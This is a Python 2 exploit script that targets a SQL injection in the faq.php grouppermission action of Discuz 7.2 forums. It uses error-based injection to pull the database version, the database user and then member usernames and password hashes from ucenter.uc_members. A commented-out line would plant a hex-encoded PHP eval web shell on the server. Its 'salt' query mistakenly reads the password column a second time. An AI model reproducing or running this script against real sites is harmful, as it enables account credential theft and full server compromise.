# coding=utf-8
import urllib
import urllib2
import re
import sys

def gethtml(url, sql):
    link = url + "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat("
    link = link + "("+ urllib.quote(sql) + "),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23"
    fd = urllib2.urlopen(link)

    #print fd.readlines()
    errorinfo = None
    for line in fd.readlines():
        if line.find("Duplicate entry") != -1:
            errorinfo = line
            break

    #print errorinfo
    if errorinfo is None:
        return None

    ret = errorinfo.split("\'")[1][0:-1]
    if ret is None:
        return None

    #print ret
    return ret


def usage():
  if len(sys.argv) < 2:
    print ''
    print 'Usage:' 
    print '  python diz7.2.py [url] [num=10]'
    sys.exit(1)


def main():
    usage()

    url = sys.argv[1]
    if len(sys.argv) <= 2:
        getnum = 10
    else:
        getnum = int(sys.argv[2])

    dbversion = gethtml(url, "version()")
    dbuser = gethtml(url, "user()")
    dbdatabase = gethtml(url, "database()")
    dblen = gethtml(url, "select count(password) from cdb_members ")

    print
    print dbversion
    print dbuser
    print dbdatabase
    print dblen
    print 

    for loop in range(int(dblen)):
        if loop > getnum:
            break
        try:
            #username_list = "select concat_ws('@',username,password,salt) from ucenter.uc_members limit %d,1" % loop
            #password_list = "select password from ucenter.uc_members limit %d,1" % loop
            username = gethtml(url, "select username from ucenter.uc_members limit %d,1" % loop)
            password = gethtml(url, "select password from ucenter.uc_members limit %d,1" % loop)
            salt = gethtml(url, "select password from ucenter.uc_members limit %d,1" % loop)

            print "[%-2d] user: %-15s password: %s salt: %s" % (loop+1, username, password, salt)
        except Exception,e:
            print e
            continue


    #gethtml(url, "select 0x3c3f706870206576616c28245f524551554553545b636d645d293b3f3e into outfile 'C:/www/ok.php'")
#main()


if __name__ == "__main__":
    main()


